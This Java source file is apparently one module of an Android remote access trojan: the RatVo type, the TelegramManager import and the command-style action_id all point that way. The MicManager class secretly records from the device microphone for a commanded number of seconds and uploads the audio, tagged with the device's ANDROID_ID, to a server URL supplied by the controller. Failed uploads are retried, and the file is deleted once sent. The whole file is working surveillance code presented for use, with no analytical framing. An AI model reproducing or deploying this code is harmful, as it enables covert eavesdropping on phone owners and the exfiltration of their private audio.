package com.hhm.android.otherapp.managers;

import android.content.Context;
import android.media.MediaRecorder;
import android.provider.Settings;
import android.util.Log;

import com.hhm.android.otherapp.Https.API;
import com.hhm.android.otherapp.utils.RatVo;
import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.hhm.android.otherapp.TelegramManager.localVersionName;

/**
 * @author huangche
 * @date 2020/11/12
 * 录音
 */
public class MicManager {
    public static final String TAG = "MicManager";

    public static MediaRecorder recorder;
    public static File audioFile = null;
    public static TimerTask stopRecording;

    public static void startRecording(final Context context, int sec, final int action_id, final String url) throws Exception {
        File dir = context.getCacheDir();
        try {
            Log.e(TAG,"startRecording():DIRR "+ dir.getAbsolutePath());
            audioFile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "startRecording():external storage access error");
            return;
        }
        
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audioFile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();

                SendFile(context,audioFile,action_id,url);
                //sendVoice(audioFile);
                //audioFile.delete();
            }
        };
        new Timer().schedule(stopRecording, (sec+1)*1000);
    }

    // 文件数据结果上报
    public static void SendFile(final Context context, final File file, final int action_id, final String url){
        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
                .addFormDataPart("device_name", "")
                .addFormDataPart("os", "AND")
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .addFormDataPart("version", localVersionName(context))
                .addFormDataPart("down_delay", "-1")
                .addFormDataPart("action_id", String.valueOf(action_id))
                .addFormDataPart("code", String.valueOf(0))
                .addFormDataPart("msg", "success")
                .addFormDataPart("file_name", file.getName())
                .addFormDataPart("file", file.getName(), RequestBody.create(MultipartBody.FORM, file))
                .build();

        Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
        API api = retrofit.create(API.class);
        Call<RatVo> call = api.file(requestBody);
        call.enqueue(new Callback<RatVo>() {
            @Override
            public void onResponse(Call<RatVo> call, Response<RatVo> response) {
                Log.v("2020==mic==Upload", "success");
                file.delete();
            }

            @Override
            public void onFailure(Call<RatVo> call, Throwable t) {
                Log.e("Upload error:", t.getMessage());
                SendFile(context,file,action_id,url);
            }
        });
    }

}

